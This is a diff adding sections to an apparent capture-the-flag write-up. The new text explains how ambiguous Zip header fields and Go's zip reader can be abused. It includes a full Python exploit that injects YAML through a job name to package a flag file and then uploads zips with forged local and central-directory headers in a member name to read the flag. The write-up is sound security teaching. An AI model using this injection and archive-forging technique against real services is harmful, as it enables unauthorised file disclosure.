@@ -147,7 +147,221 @@ The CD consists of a _CD File Header_ for each file in the archive, that contain
 As mentioned above, the Zip archive does not need to end in the CD. The standard allows for a _File comment_ of length up to 65535 bytes after the CD, which can contain arbitrary data.
 (Flags for example).
 
+### 0x04 Zip! Y u so nasty??? 
 
+The keen reader might have observed that the format allows for some nasty ambiguities: Some header fields, like `crc-32` and `compression` are in the directory header AND member header, so which one takes precedence? 
+We checked the go implementation. It seems like it will always use the value in the directory header for all fields that are interesting to us. So here we go: Overwrite the metadata in the central directory to go straight to the flag! Easy! Right? No.
+
+The trouble is that we can not control the zip metadata that `compress_files` will write. It will just 
+open the provided archive and copy the members into a new zip archive with defaults for compression, 
+a proper crc, etc. In addition: The `download` function gives us an empty file if the go zip reader 
+encounters anything it doesn't like, for example invalid checksums or data that doesn't properly decompress. 
+
+But truth be told, we do control one of the header fields: The member name! After a lot of head scratching our refined 
+exploit plan looks like this:
+
+1. Create a large `manyflgs.tar` with the flag inside using our InYection
+2. Write a smaller `small.zip` into the tar, so we have a zip directory header
+3. Write an even smaller `tiny.zip` into the tar, with a member name that:
+   - Contains a valid local header 
+   - Overrides the `member offset` in the CD to point to the member header mentioned above
+   - Overrides the `compression-method` and `crc` in the CD to `0` 
+   - Does not break the central directory in a way that upsets the go zip reader 
+4. Download the flag from our "crafted" zip
+
+
+
+### 0x05 Exploit: 
+
+```python
+import base64
+import re
+import urllib
+from zipfile import ZipFile
+
+from websocket import create_connection
+
+ws = create_connection("ws://localhost:5555/ws/")
+
+
+def cmd(cmd, do_rcv: bool = True):
+    ws.send(cmd)
+    if do_rcv:
+        return ws.recv()
+    else:
+        return
+
+
+def upload(name, data):
+    data = base64.b64encode(data).decode()
+    r = cmd(f"upload {name} {data}")
+    l = r.strip().split(" ")
+    assert l[0] == "upload-success", r
+
+
+def download(name):
+    r = cmd(f"download {name}")
+    l = r.strip().split(" ")
+    assert l[0] == "file", r
+
+    return base64.b64decode(l[2])
+
+
+def create_manyflgs_zip():
+    name = '''manyflgs"
+      artifacts:
+        - "flag.txt"
+        - "flag.txt" 
+    - use: archive
+      name: "'''
+
+    cmd("job package " + urllib.parse.quote(name))
+
+
+def upload_small_zip():
+    filename_len = 11  # gives us nicely aligned local headers
+
+    with ZipFile("small.zip", mode="w") as zip_file:
+        with zip_file.open("D" * 100, mode="w") as mem:
+            mem.write(b"A")
+
+        for i in range(3):
+            with zip_file.open(str(i) * filename_len, mode="w") as mem:
+                mem.write(b"B")
+
+    with open("small.zip", "rb") as f:
+        upload("manyflgs.tar.zip", f.read())
+
+
+def upload_tiny_zip():
+    # Value eyballed with trial,error and hex viewer
+    filename_len = 145
+    # Using a placeholder string as file name, because zipfile doesn't like bytes as member names
+    # Replaced with bytes below
+    placeholder = b"{{" + b"A" * (filename_len - 4) + b"}}"
+
+    with ZipFile("tiny.zip", mode="w") as zip_file:
+        with zip_file.open(placeholder.decode(), mode="w") as mem:
+            mem.write(b"ABC")
+
+    # local file header, most fields are irrelevant (set to zero)
+    local_file_header = bytes(
+        [
+            0x50,
+            0x4B,
+            0x03,
+            0x04,  # magic bytes
+            0x00,
+            0x00,  # version
+            0x00,
+            0x00,  # flags
+            0x00,
+            0x00,  # compression
+            0x00,
+            0x00,  # mod time
+            0x00,
+            0x00,  # mod date
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # checksum
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # compressed size
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # uncompressed size
+            0x00,
+            0x00,  # name length
+            0x00,
+            0x00,  # extra field length
+            0x00,
+            0x00,  # file name
+        ]
+    )
+
+    # central directory header, most fields are irrelevant (set to zero)
+    central_directory_header = bytes(
+        [
+            0x50,
+            0x4B,
+            0x01,
+            0x02,  # magic bytes
+            0x00,
+            0x00,  # version
+            0x00,
+            0x00,  # version needed
+            0x00,
+            0x00,  # flags
+            0x00,
+            0x00,  # compression
+            0x00,
+            0x00,  # mod time
+            0x00,
+            0x00,  # mod date
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # checksum
+            0x00,
+            0x07,
+            0x00,
+            0x00,  # compressed size
+            0x00,
+            0x07,
+            0x00,
+            0x00,  # uncompressed size
+            0x02,
+            0x00,  # name length
+            0x62,
+            0x00,  # extra field len
+            0x00,
+            0x00,  # file comment len
+            0x00,
+            0x00,  # disk number start
+            0x00,
+            0x00,  # internal attributes
+            0x00,
+            0x00,
+            0x00,
+            0x00,  # external attributes
+            0x39,
+            0x01,
+            0x00,
+            0x00,  # offset of local header
+        ]
+    )
+
+    payload = local_file_header + central_directory_header
+    padding_len = len(placeholder) - len(payload)
+
+    # Replace member names with our payload
+    with open("tiny.zip", "rb") as f:
+        contents = f.read()
+
+    for result in re.finditer(b"{{A*}}", contents):
+        start, stop = result.span()
+        assert len(payload) + padding_len == stop - start
+        contents = contents[: start + padding_len] + payload + contents[stop:]
+
+    upload("manyflgs.tar.zip", contents)
+
+
+if __name__ == "__main__":
+    create_manyflgs_zip()
+    input("manyflgs.tar created, hit enter to continue...")
+    upload_small_zip()
+    input("small.zip uploaded, hit enter to continue...")
+    upload_tiny_zip()
+    print("tiny.zip uploaded. Downloading flag:")
+
+    # Member name is "PK" because those are the magic bytes for a directory header entry
+    recv_zip = download("manyflgs.tar/PK")
+    print(re.findall(rb"flug\{.*?\}", recv_zip)[0].decode())
+
+```
 
 ### 0x06 Fix(es):
 
